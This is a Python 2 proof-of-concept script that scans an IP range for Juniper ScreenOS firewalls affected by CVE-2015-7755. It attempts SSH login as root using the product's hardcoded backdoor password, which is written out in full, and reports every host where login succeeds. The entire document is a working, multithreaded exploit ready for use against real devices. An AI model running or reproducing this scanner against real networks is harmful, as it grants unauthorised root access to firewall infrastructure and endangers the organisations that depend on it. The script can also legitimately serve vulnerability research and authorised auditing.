#-*-coding:utf-8-*-
__author__ = 'Qsaka'

import sys
import argparse
from threading import Thread
import paramiko
from IPy import IP

vuln_host = []

class tThread(Thread):
	def __init__(self, ip):
		Thread.__init__(self)
		self.ip = ip
	def run(self):
		scan(self.ip)
				
def scan(ip):
	global vuln_host
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect( ip, port=22, username='root', password='''<<< %s(un='%s') = %u''', )
  		vuln_host.append(ip)
	except Exception,e:
		print e		
	finally:
		client.close()
		del client

def main():
	parser = argparse.ArgumentParser(description='CVE-2015-7755	 Juniper ScreenOS 6.2.0r15—6.2.0r18，6.3.0r12—6.3.0r20 sshd Backdoor POC')
	parser.add_argument('-t',dest='target',help='target ip address',default=None)
	args = parser.parse_args(sys.argv[1:])
	global vuln_host
	if args.target != None:
		ipAddress = [ x.strNormal() for x in IP(args.target) ]
		thread_Line = [tThread(ip) for ip in ipAddress]
		for t in thread_Line:
			t.start()
		for t in thread_Line:
			t.join()
		if vuln_host:		
			for x in vuln_host:
				print '[+]: '+ x +' is vulnerable'
		else:
			print '[ ]: No vulnerable host'
	else:
		print 'Please use --help && sudo !'
if __name__ == '__main__':
	main()